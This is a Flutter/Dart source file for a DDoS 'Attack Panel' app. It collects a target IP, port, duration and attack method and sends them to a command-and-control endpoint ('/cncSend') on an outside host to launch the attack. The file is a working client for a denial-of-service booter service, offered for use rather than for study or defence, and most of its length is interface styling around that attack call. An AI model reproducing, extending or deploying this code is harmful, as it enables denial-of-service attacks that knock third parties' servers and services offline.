import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final String baseUrl = "https://yosh.nullxteam.fun";
  late AnimationController _controller;
  String selectedDoosId = "";
  double attackDuration = 60;

  // 🎨 PALETTE BIRU - Oceanic Blue
  final Color primaryDark = const Color(0xFF0A1929);      // Dark navy blue
  final Color primaryBlue = const Color(0xFF2B4F8C);      // Medium blue
  final Color accentBlue = const Color(0xFF1E3A6F);       // Dark blue accent
  final Color lightBlue = const Color(0xFF4A7DB5);        // Light blue
  final Color softWhite = const Color(0xFFF0F4FA);        // Soft white with blue tint
  final Color cardBlue = const Color(0xFF13263E);         // Card background blue
  final Color tealAccent = const Color(0xFF1B9C9C);       // Teal accent
  final Color cyanLight = const Color(0xFF4ECDC4);        // Cyan light
  final Color royalBlue = const Color(0xFF4169E1);        // Royal blue

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }
  }

  Future<void> _sendDoos() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty || key.isEmpty) {
      _showAlert("❌ Invalid Input", "Target IP cannot be empty.");
      return;
    }

    if (selectedDoosId != "icmp" && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("❌ Invalid Port", "Please input a valid port.");
      return;
    }

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);
      print(data);

      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Please wait a moment before sending again.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Invalid Key", "Your session key is invalid. Please log in again.");
      } else if (data["sended"] == false) {
        _showAlert("⚠️ Failed", "Failed to send attack. The server may be under maintenance.");
      } else {
        _showAlert("✅ Success", "Attack has been successfully sent to $target.");
      }
    } catch (_) {
      _showAlert("❌ Error", "An unexpected error occurred. Please try again.");
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardBlue,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: cyanLight) // Border cyan
        ),
        title: Text(title, style: TextStyle(color: cyanLight, fontFamily: 'Orbitron')),
        content: Text(msg, style: TextStyle(color: softWhite.withOpacity(0.7), fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK", style: TextStyle(color: cyanLight)),
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    return Scaffold(
      backgroundColor: primaryDark,
      appBar: AppBar(
        backgroundColor: primaryDark,
        elevation: 0,
        title: Text(
          "🚀 Attack Panel",
          style: TextStyle(
            fontFamily: 'Orbitron',
            fontWeight: FontWeight.bold,
            color: softWhite,
          ),
        ),
        centerTitle: true,
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            children: [
              // Logo dengan efek fade dan shadow biru
              FadeTransition(
                opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
                child: Container(
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: cyanLight.withOpacity(0.3),
                        blurRadius: 20,
                        spreadRadius: 2,
                      ),
                    ],
                  ),
                  child: ClipOval(
                    child: Image.asset(
                      'assets/images/logo.png',
                      width: 120,
                      height: 120,
                      fit: BoxFit.cover,
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 20),
              Text(
                "Target Input & Methods",
                style: TextStyle(
                  color: softWhite,
                  fontFamily: 'Orbitron',
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  shadows: [
                    Shadow(
                      color: cyanLight.withOpacity(0.5),
                      blurRadius: 10,
                    ),
                  ],
                ),
              ),
              Divider(color: cyanLight, thickness: 0.6),
              const SizedBox(height: 25),

              // === Target Input Card ===
              _buildInputCard(
                icon: Icons.computer,
                title: "Target IP",
                child: TextField(
                  controller: targetController,
                  style: TextStyle(color: softWhite),
                  cursorColor: cyanLight,
                  decoration: _inputStyle("Target IP (e.g. 1.1.1.1)"),
                ),
              ),
              const SizedBox(height: 20),

              // === Port Input Card ===
              _buildInputCard(
                icon: Icons.wifi_tethering,
                title: "Port",
                child: TextField(
                  controller: portController,
                  enabled: !isIcmp,
                  keyboardType: TextInputType.number,
                  style: TextStyle(color: isIcmp ? Colors.grey : softWhite),
                  cursorColor: isIcmp ? Colors.grey : cyanLight,
                  decoration: _inputStyle(
                    isIcmp ? "ICMP does not use port" : "Port (e.g. 80)",
                    isIcmp: isIcmp,
                  ),
                ),
              ),
              const SizedBox(height: 20),

              // === Duration Slider ===
              _buildInputCard(
                icon: Icons.timer,
                title: "Attack Duration",
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text("⏱ ${attackDuration.toInt()} seconds",
                        style: TextStyle(color: softWhite.withOpacity(0.7), fontSize: 14)),
                    Slider(
                      value: attackDuration,
                      min: 10,
                      max: 300,
                      divisions: 29,
                      label: "${attackDuration.toInt()}s",
                      activeColor: cyanLight,
                      inactiveColor: softWhite.withOpacity(0.1),
                      onChanged: (value) {
                        setState(() => attackDuration = value);
                      },
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 20),

              // === Dropdown Attack Methods ===
              _buildInputCard(
                icon: Icons.flash_on,
                title: "Attack Method",
                child: DropdownButtonHideUnderline(
                  child: DropdownButton<String>(
                    dropdownColor: cardBlue,
                    value: selectedDoosId,
                    isExpanded: true,
                    iconEnabledColor: cyanLight,
                    style: TextStyle(color: softWhite),
                    items: widget.listDoos.map((doos) {
                      return DropdownMenuItem<String>(
                        value: doos['ddos_id'],
                        child: Text(
                          doos['ddos_name'],
                          style: TextStyle(color: softWhite),
                        ),
                      );
                    }).toList(),
                    onChanged: (value) {
                      setState(() {
                        selectedDoosId = value!;
                      });
                    },
                  ),
                ),
              ),
              const SizedBox(height: 40),

              // === Send Button dengan gradient biru ===
              SizedBox(
                width: double.infinity,
                child: Container(
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(16),
                    gradient: LinearGradient(
                      colors: [primaryBlue, cyanLight, tealAccent],
                      begin: Alignment.centerLeft,
                      end: Alignment.centerRight,
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: cyanLight.withOpacity(0.6),
                        blurRadius: 15,
                        spreadRadius: 2,
                      ),
                    ],
                  ),
                  child: ElevatedButton.icon(
                    onPressed: _sendDoos,
                    icon: Icon(Icons.bolt, color: softWhite),
                    label: Text(
                      "LAUNCH ATTACK",
                      style: TextStyle(
                        fontSize: 16,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1.2,
                        color: softWhite,
                      ),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.transparent,
                      shadowColor: Colors.transparent,
                      padding: const EdgeInsets.symmetric(vertical: 14),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                      elevation: 0,
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: cardBlue,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: cyanLight.withOpacity(0.5), width: 1),
        boxShadow: [
          BoxShadow(
            color: cyanLight.withOpacity(0.2),
            blurRadius: 8,
            spreadRadius: 1,
          ),
          BoxShadow(
            color: primaryBlue.withOpacity(0.1),
            blurRadius: 4,
            offset: Offset(0, 2),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: EdgeInsets.all(4),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [primaryBlue, cyanLight],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  shape: BoxShape.circle,
                ),
                child: Icon(icon, color: softWhite, size: 20),
              ),
              const SizedBox(width: 8),
              Text(title,
                  style: TextStyle(
                    color: softWhite,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Orbitron',
                    fontSize: 15,
                  )),
            ],
          ),
          const SizedBox(height: 10),
          child,
        ],
      ),
    );
  }

  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(color: isIcmp ? Colors.grey : cyanLight.withOpacity(0.7)),
      filled: true,
      fillColor: primaryDark,
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      enabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? Colors.grey : cyanLight.withOpacity(0.5)),
        borderRadius: BorderRadius.circular(16),
      ),
      focusedBorder: OutlineInputBorder(
        borderSide: BorderSide(color: cyanLight, width: 2),
        borderRadius: BorderRadius.circular(16),
      ),
      border: OutlineInputBorder(
        borderRadius: BorderRadius.circular(16),
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }
}